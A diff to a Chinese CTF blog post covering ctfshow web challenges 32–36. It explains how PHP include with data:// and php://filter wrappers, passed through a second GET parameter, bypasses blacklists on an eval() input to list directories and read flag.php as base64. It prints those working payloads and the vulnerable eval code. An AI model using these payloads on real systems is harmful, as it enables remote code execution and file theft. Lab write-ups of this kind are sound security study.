@@ -4,7 +4,7 @@ description: web-wp
 recommend: 5
 permalink: /2026/ctfshow-web-command-exec
 date: 2026-11-01 10:15:00
-updated: 2026-11-01 10:16:00
+updated: 2026-11-03 16:27:00
 image:  /images/baopo/2.jpg
 categories: [web]
 tags: [web,命令执行]
@@ -367,6 +367,10 @@ if(isset($_GET['c'])){
 
 但是我们平时写题时见多了`include()`带括号的形式，容易先入为主，以为它是函数，其实不是
 
+##### include的作用：
+
+**读取并执行 或 包含，但包含不包括输出**
+
 #### 双参数
 
 记得之前也提过这个思路，代码中被检查的只有变量C,这时候就可以用双变量，绕过对C的黑名单检查
@@ -376,6 +380,48 @@ if(isset($_GET['c'])){
 ```
 ?c=include$_GET[1]?>&1=data://text/plain,<?php print_r(scandir(getcwd()));?>
 ```
+
+#### 为什么要这么写呢？
+
+##### 双参数为什么不可以这样写？  ?c=include$_GET[1]?>&1=print_r(scandir(getcwd()));
+
+原因就在include,我们来看，把1带进前边的$_GET[1]_之后是怎么样的: 
+
+?c=include "print_r(scandir(getcwd()))" 
+
+include看到后面`"print_r(scandir(getcwd()))" `这一串会把它当成文件名，意思是，试图打开名叫print_r(scandir(getcwd()))的文件，没有这个文件名，则失败
+
+##### 所以`?c=include$_GET[1]?>&1=data://text/plain,<?php print_r(scandir(getcwd()));?>`是怎么作用的呢？
+
+先把1带进前边的$_GET[1]_：
+
+`?c=include "data://text/plain,<?php print_r(scandir(getcwd()));?>"`
+
+**data://:数据url包装器，把后边的字符串变成内存流，这个“流”感觉有点抽象，其实就是data://给了后边的字符串一个接口，让include可以像读文件一样读取它**
+
+过程：
+
+data://把逗号后边的字符串`<?php print_r(scandir(getcwd()));?>`变成内存流
+
+include:读取这个流，内容就是`<?php print_r(scandir(getcwd()));?>`
+
+因为内容有<?php,include执行它
+
+scandir(getcwd()):获取当前目录，返回数组
+
+print_r:把数组打印出来
+
+##### include "data://text/plain,`<?php print_r(scandir(getcwd()));?>`"和include "php://filter/.../resource=flag.php"的区别
+
+data://上边已经说过了，那php://filter/.../resource=flag.php是怎么工作的?二者一样吗？
+
+`include "php://filter/.../resource=flag.php"`
+
+include 打开并读取flag.php
+
+读取时会套一个Base64编码过滤器，把flag.php里的文本编码成base64文本，而不是原始 PHP 源码
+
+base64的字符集里边没有<>,所以base64编码之后不可能出现<?php开头，include看不到<?php就不会执行，会把它当作普通文本输出，所以最后看到的是 Base64，不是原始源码；需要再解码一次
 
 ![image-20261102203954763](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102203954763.png)
 
@@ -395,9 +441,53 @@ include+想要输出文件里的内容 应该怎么写来着
 具体写法
 
 ```
-php://filter/read=convert.base64-encode/resource=flag.php
+?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
 ```
 
 ![image-20261102205605635](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102205605635.png)
 
 得到之后解码即可
+
+
+
+---
+
+## web33-35
+
+**都可以用上题的办法，重点是要理解它是怎么执行的**
+
+## web36
+
+```php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+查看黑名单：
+
+`flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]`
+
+发现这题连数字都禁了，那上题的$_GET[1]是不行了，数字不行，那还有**字母**,把数字1改成字母试试看
+
+```
+?c=include$_GET[a]?>&a=data://text/plain,<?php print_r(scandir(getcwd()));?>
+```
+
+![image-20261103161719361](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261103161719361.png)
+
+```
+?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+![image-20261103161901325](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261103161901325.png)
+
+---
+
